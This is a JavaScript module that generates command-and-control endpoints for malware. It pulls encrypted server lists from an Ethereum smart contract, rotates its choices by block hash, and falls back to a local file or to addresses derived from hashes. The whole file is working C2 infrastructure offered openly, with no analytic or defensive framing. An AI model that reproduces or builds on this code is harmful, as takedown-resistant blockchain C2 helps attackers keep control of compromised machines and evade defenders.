/**
 * Blockchain C2 Generator - Multi-Block Rotation + Fallback
 */

const fs = require("fs");
const path = require("path");
const { ethers } = require("ethers");
const crypto = require("crypto");
const { getKeyFromEnv, decryptHexToJson } = require("./blockchain_c2_crypto");

let config = null;
let provider = null;

const CONTRACT_ABI = [
  "function c2Data() external view returns (bytes)"
];

function loadConfig() {
  const cfgPath = path.join(__dirname, "..", "..", "config", "blockchain_c2.json");
  if (!fs.existsSync(cfgPath)) {
    return null;
  }
  try {
    return JSON.parse(fs.readFileSync(cfgPath, "utf8"));
  } catch (e) {
    console.error("[Blockchain C2] Failed to load config:", e.message);
    return null;
  }
}

function getProvider() {
  if (!config || !config.rpc_url) return null;
  if (!provider) {
    try {
      provider = new ethers.JsonRpcProvider(config.rpc_url);
    } catch (e) {
      console.error("[Blockchain C2] Failed to create provider:", e.message);
      return null;
    }
  }
  return provider;
}

async function getReferenceBlockNumber() {
  const prov = getProvider();
  if (!prov) return null;
  try {
    const latest = await prov.getBlockNumber();
    return latest - (latest % config.block_step);
  } catch (e) {
    console.error("[Blockchain C2] Failed to get block number:", e.message);
    return null;
  }
}

function deriveHashes(seedBuffer, blockHashBuf, count) {
  const hashes = [];
  for (let i = 0; i < count; i++) {
    const h = crypto.createHash("sha256")
      .update(seedBuffer)
      .update(blockHashBuf)
      .update(Buffer.from([i]))
      .digest();
    hashes.push(h);
  }
  return hashes;
}

function mapHashToEndpoint(hash) {
  const ip = `10.${hash[0]}.${hash[1]}.${hash[2] || 1}`;
  const portBase = 1024;
  const portRange = 60000;
  const port = portBase + ((hash[3] << 8 | hash[4]) % portRange);
  return `${ip}:${port}`;
}

async function getOnChainEndpoints(aesKey) {
  if (!config.contract_address || /^0x0+$/.test(config.contract_address)) return null;

  const prov = getProvider();
  if (!prov) return null;

  try {
    const contract = new ethers.Contract(config.contract_address, CONTRACT_ABI, prov);
    const raw = await contract.c2Data();
    const hex = Buffer.from(raw).toString("hex");
    const json = decryptHexToJson(hex, aesKey);
    return json.endpoints;
  } catch (e) {
    console.error("[Blockchain C2] Failed to get on-chain endpoints:", e.message);
    return null;
  }
}

function getFallbackEndpoints() {
  if (!config || !config.fallback_config_path) return [];
  const p = path.join(__dirname, "..", "..", config.fallback_config_path);
  if (!fs.existsSync(p)) return [];
  try {
    const data = JSON.parse(fs.readFileSync(p, "utf8"));
    return data.endpoints || [];
  } catch (e) {
    console.error("[Blockchain C2] Failed to load fallback:", e.message);
    return [];
  }
}

async function generateC2Candidates() {
  // Load config if not loaded
  if (!config) {
    config = loadConfig();
    if (!config || !config.enabled) {
      return { mode: "disabled", endpoints: [] };
    }
  }

  const aesKey = getKeyFromEnv(config.aes_key_env);

  let refBlock, block;
  try {
    refBlock = await getReferenceBlockNumber();
    if (refBlock === null) {
      return { mode: "fallback", endpoints: getFallbackEndpoints() };
    }
    const prov = getProvider();
    block = await prov.getBlock(refBlock);
  } catch (_) {
    return { mode: "fallback", endpoints: getFallbackEndpoints() };
  }

  if (!block || !block.hash) {
    return { mode: "fallback", endpoints: getFallbackEndpoints() };
  }

  const blockHashBuf = Buffer.from(block.hash.slice(2), "hex");
  const count = config.candidates_per_cycle || 5;
  const seed = Buffer.from("blockchain-c2-seed");

  const hashes = deriveHashes(seed, blockHashBuf, count);
  let onChainEndpoints = null;

  try {
    onChainEndpoints = await getOnChainEndpoints(aesKey);
  } catch (_) {}

  if (onChainEndpoints && onChainEndpoints.length > 0) {
    const endpoints = hashes.map(h => onChainEndpoints[h[0] % onChainEndpoints.length]);
    return { mode: "on-chain", refBlock, endpoints: [...new Set(endpoints)] };
  }

  const endpoints = hashes.map(mapHashToEndpoint);
  return { mode: "hash-only", refBlock, endpoints: [...new Set(endpoints)] };
}

module.exports = { generateC2Candidates, getFallbackEndpoints, loadConfig };

